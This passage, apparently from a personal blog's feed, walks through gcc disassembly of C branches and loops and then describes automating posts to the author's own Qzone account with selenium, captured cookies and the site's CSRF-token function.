&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;理解：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;0-f：喜闻乐见的函数开头，压入rbp寄存器的值（保存堆栈帧的基址），把栈指针rsp保存到rbp，栈顶指针下移16字节，（为局部变量保留空间），把x=1,y=2,压入栈中&lt;/li&gt;
  &lt;li&gt;16-1c：把x=1放入eax寄存器中，与y=2比较大小，如果不相等，跳转到2f处执行&lt;/li&gt;
  &lt;li&gt;1e-28：调用printf的一套操作，清空edi，eax，然后调用&lt;/li&gt;
  &lt;li&gt;2d：无条件跳转到3e段&lt;/li&gt;
  &lt;li&gt;2f-39：同1e-28&lt;/li&gt;
  &lt;li&gt;3e-44：喜闻乐见的函数结尾，把eax清零（返回值为0），恢复堆栈帧（恢复esp的值，弹出ebp的值），函数返回&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;whilefor&quot;&gt;while/for&lt;/h2&gt;
&lt;p&gt;一段c代码&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;代码段的汇编&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;   0:	55                   	push   %rbp
   1:	48 89 e5             	mov    %rsp,%rbp
   4:	48 83 ec 10          	sub    $0x10,%rsp
   8:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%rbp)
   f:	eb 18                	jmp    29 &amp;lt;main+0x29&amp;gt;
  11:	8b 45 f8             	mov    -0x8(%rbp),%eax
  14:	89 c6                	mov    %eax,%esi
  16:	bf 00 00 00 00       	mov    $0x0,%edi
  1b:	b8 00 00 00 00       	mov    $0x0,%eax
  20:	e8 00 00 00 00       	callq  25 &amp;lt;main+0x25&amp;gt;
  25:	83 45 f8 01          	addl   $0x1,-0x8(%rbp)
  29:	83 7d f8 09          	cmpl   $0x9,-0x8(%rbp)
  2d:	7e e2                	jle    11 &amp;lt;main+0x11&amp;gt;
  2f:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
  36:	eb 18                	jmp    50 &amp;lt;main+0x50&amp;gt;
  38:	8b 45 fc             	mov    -0x4(%rbp),%eax
  3b:	89 c6                	mov    %eax,%esi
  3d:	bf 00 00 00 00       	mov    $0x0,%edi
  42:	b8 00 00 00 00       	mov    $0x0,%eax
  47:	e8 00 00 00 00       	callq  4c &amp;lt;main+0x4c&amp;gt;
  4c:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
  50:	83 7d fc 09          	cmpl   $0x9,-0x4(%rbp)
  54:	7e e2                	jle    38 &amp;lt;main+0x38&amp;gt;
  56:	b8 00 00 00 00       	mov    $0x0,%eax
  5b:	c9                   	leaveq 
  5c:	c3                   	retq   
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;理解：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;0-4：函数头部&lt;/li&gt;
  &lt;li&gt;8：局部变量x=0入栈&lt;/li&gt;
  &lt;li&gt;f：跳转29处&lt;/li&gt;
  &lt;li&gt;11-20：打印x的值&lt;/li&gt;
  &lt;li&gt;25：增加x的值&lt;/li&gt;
  &lt;li&gt;29-2d：比较9与x的值，小于或等于时跳转11处&lt;/li&gt;
  &lt;li&gt;2f：局部变量x=0入栈&lt;/li&gt;
  &lt;li&gt;36：跳转50处&lt;/li&gt;
  &lt;li&gt;38-47：打印x的值&lt;/li&gt;
  &lt;li&gt;4c：增加x的值&lt;/li&gt;
  &lt;li&gt;50-54：比较9与x的值，小于或等于时跳转38处&lt;/li&gt;
  &lt;li&gt;56-5c：函数尾部&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;（for和while的实现方式貌似差不多）&lt;/p&gt;

&lt;h2 id=&quot;switch-case&quot;&gt;switch-case&lt;/h2&gt;
&lt;p&gt;一段c代码&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;switch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;case 0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;case 1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;case 2&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;default&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;代码段的汇编&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;   0:	55                   	push   %rbp
   1:	48 89 e5             	mov    %rsp,%rbp
   4:	48 83 ec 10          	sub    $0x10,%rsp
   8:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%rbp)
   f:	8b 45 fc             	mov    -0x4(%rbp),%eax
  12:	83 f8 01             	cmp    $0x1,%eax
  15:	74 15                	je     2c &amp;lt;main+0x2c&amp;gt;
  17:	83 f8 02             	cmp    $0x2,%eax
  1a:	74 1c                	je     38 &amp;lt;main+0x38&amp;gt;
  1c:	85 c0                	test   %eax,%eax
  1e:	75 24                	jne    44 &amp;lt;main+0x44&amp;gt;
  20:	bf 00 00 00 00       	mov    $0x0,%edi
  25:	e8 00 00 00 00       	callq  2a &amp;lt;main+0x2a&amp;gt;
  2a:	eb 23                	jmp    4f &amp;lt;main+0x4f&amp;gt;
  2c:	bf 00 00 00 00       	mov    $0x0,%edi
  31:	e8 00 00 00 00       	callq  36 &amp;lt;main+0x36&amp;gt;
  36:	eb 17                	jmp    4f &amp;lt;main+0x4f&amp;gt;
  38:	bf 00 00 00 00       	mov    $0x0,%edi
  3d:	e8 00 00 00 00       	callq  42 &amp;lt;main+0x42&amp;gt;
  42:	eb 0b                	jmp    4f &amp;lt;main+0x4f&amp;gt;
  44:	bf 00 00 00 00       	mov    $0x0,%edi
  49:	e8 00 00 00 00       	callq  4e &amp;lt;main+0x4e&amp;gt;
  4e:	90                   	nop
  4f:	b8 00 00 00 00       	mov    $0x0,%eax
  54:	c9                   	leaveq 
  55:	c3                   	retq   
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;理解：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;0-4：函数头部&lt;/li&gt;
  &lt;li&gt;8：x = 1入栈&lt;/li&gt;
  &lt;li&gt;f-1a：与1相比较，如果相等的话，跳转2c处，与2相比较，如果相等的话，跳转38处&lt;/li&gt;
  &lt;li&gt;1c-1e：尝试x与x的and运算，只改变标志位C，O，如果结果不为0，跳转44处&lt;/li&gt;
  &lt;li&gt;20-2a：调用printf函数，跳转4f处（case 0）&lt;/li&gt;
  &lt;li&gt;2c-36：调用printf函数，跳转4f处（case 1）&lt;/li&gt;
  &lt;li&gt;38-42：调用printf函数，跳转4f处（case 2）&lt;/li&gt;
  &lt;li&gt;44-49：调用printf函数（default）&lt;/li&gt;
  &lt;li&gt;4e：空指令&lt;/li&gt;
  &lt;li&gt;4f-55：函数尾部&lt;/li&gt;
&lt;/ul&gt;

</content>
<category term="bin" />
<summary>  if-else, while/for, switch-case  编译器：gcc (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609</summary>
</entry>
<entry>
<title>Crawler Sharing</title>
<link href="http://localhost:4000/2017/10/13/Crawler.html" rel="alternate" type="text/html" title="Crawler Sharing" />
<published>2017-10-13T00:00:00+08:00</published>
<updated>2017-10-13T00:00:00+08:00</updated>
<id>http://localhost:4000/2017/10/13/Crawler</id>
<content type="html" xml:base="http://localhost:4000/2017/10/13/Crawler.html">&lt;blockquote&gt;
  &lt;p&gt;一次爬虫的记录与分享&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;0x00准备&quot;&gt;0x00准备&lt;/h2&gt;

&lt;p&gt;安装selenium库，使用urllib库，re库&lt;/p&gt;

&lt;h2 id=&quot;0x01实现&quot;&gt;0x01实现&lt;/h2&gt;

&lt;h3 id=&quot;selenium模拟登录&quot;&gt;selenium模拟登录&lt;/h3&gt;

&lt;p&gt;emmm,起因是为了实现自动在qzone发送说说，然后到github上去翻了翻，发现轮子都已经失效了（&lt;del&gt;大概没人喜欢做这么无聊的事吧&lt;/del&gt;
登录qzone: i.qq.com，查看到qzone的登录是利用js实现的
&lt;img src=&quot;https://raw.githubusercontent.com/void0red/Pictures/master/blog/crawler0.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;并没有想去分析qzone的js算法，决定使用selenium模拟登录qzone，不难操作，然后取得当前页面，也就是登录完成的页面的cookie，（注意！用sleep来等待大量数据加载完成，许多操作不能达到预计效果可能是因为网络不佳造成的）&lt;/p&gt;

&lt;p&gt;除了cookie，还有当前页面的源代码也要保存下来（笑&lt;/p&gt;

&lt;h3 id=&quot;分析说说发送过程&quot;&gt;分析说说发送过程&lt;/h3&gt;

&lt;p&gt;在首页随便发送一条说说，截获一条post请求&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/void0red/Pictures/master/blog/crawler1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;分析结构，发现请求地址很长&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://user.qzone.qq.com/proxy/domain/taotao.qzone.qq.com/cgi-bin/emotion_cgi_publish_v6?g_tk=91245527&amp;amp;qzonetoken=010dee36790ae077dbba7521e3e0838b6d9ef25271a9260c8040cd2c2e976f58f614e3ab913c683dfb5c90
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;前面一部分是固定的（除非人为的话，后面有两个参数g_tk和qzonetoken，这是两个为了加密而设置的参数，通过js来获得，qzonetoken的函数源码没有找到，查询网络上的也是一些过时的（算法早就改变了，于是我从主页的源码中扣下来，在最底下，用正则来截取&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/void0red/Pictures/master/blog/crawler2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;g_tk无法在源码中找到，于是刷新主页，查到在一个&lt;code class=&quot;highlighter-rouge&quot;&gt;interface_mini.js?max_age=60628&lt;/code&gt;的js文件里有定义&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;nx&quot;&gt;QZONE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;FrontPage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getACSRFToken&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;QZFL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;util&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;URI&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;skey&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;host&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;indexOf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;qzone.qq.com&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;skey&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;QZFL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;p_skey&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;host&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;indexOf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;qq.com&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;nx&quot;&gt;skey&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;QZFL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;skey&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;skey&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;skey&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;parent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;QZFL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;p_skey&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;skey&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;QZFL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;p_skey&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;skey&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;nx&quot;&gt;skey&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;QZFL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;skey&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;QZFL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;rv2&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5381&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;skey&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span 